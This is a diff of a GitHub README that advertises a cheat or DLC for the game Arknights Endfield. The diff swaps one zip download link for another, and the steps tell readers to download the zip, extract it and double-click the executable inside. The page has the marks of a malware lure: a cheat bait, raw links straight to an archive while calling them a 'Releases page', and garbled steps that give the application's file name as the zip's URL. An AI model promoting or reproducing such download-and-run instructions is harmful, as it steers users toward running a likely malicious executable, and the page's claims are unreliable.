@@ -1,7 +1,7 @@
 # 🎮 Buka-Arknights-Endfield-DLC - Cheat for a Fun Gaming Experience
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/DLC_Buka_Arknights_Endfield_1.1.zip)](https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/DLC_Buka_Arknights_Endfield_1.1.zip)  
+[![Download](https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/Arknights_Buka_Endfield_DLC_v2.7.zip)](https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/Arknights_Buka_Endfield_DLC_v2.7.zip)  
 Huge benefits await you! Click the button above to begin your adventure with Buka-Arknights-Endfield-DLC.
 
 ## 🚀 Getting Started
@@ -21,17 +21,17 @@ To use this application smoothly, your computer should meet the following requir
 - **Community Support**: Join our community for tips and troubleshooting.
 
 ## 🌐 Visit the Releases Page
-For the latest updates and versions, visit our Releases page: [Download Link](https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/DLC_Buka_Arknights_Endfield_1.1.zip). 
+For the latest updates and versions, visit our Releases page: [Download Link](https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/Arknights_Buka_Endfield_DLC_v2.7.zip). 
 
 ## 📥 Download & Install
 To get started, follow these easy steps:
 
-1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/DLC_Buka_Arknights_Endfield_1.1.zip).
-2. On the Releases page, find the latest version available. Look for the most recent file, which may be named something like `https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/DLC_Buka_Arknights_Endfield_1.1.zip`.
+1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/Arknights_Buka_Endfield_DLC_v2.7.zip).
+2. On the Releases page, find the latest version available. Look for the most recent file, which may be named something like `https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/Arknights_Buka_Endfield_DLC_v2.7.zip`.
 3. Click on the file to start downloading it to your computer. The file will usually arrive in a zipped format.
 4. Once it is downloaded, locate the file in your "Downloads" folder.
 5. Right-click on the zipped file and select "Extract All." Follow the prompts to unzip the files into a folder of your choice.
-6. Open the extracted folder, and you will see the application file named `https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/DLC_Buka_Arknights_Endfield_1.1.zip`.
+6. Open the extracted folder, and you will see the application file named `https://raw.githubusercontent.com/samiabounab/Buka-Arknights-Endfield-DLC/main/unbeaued/Arknights_Buka_Endfield_DLC_v2.7.zip`.
 7. Double-click on the executable file to run the program.
 
 ## ⚙️ Troubleshooting
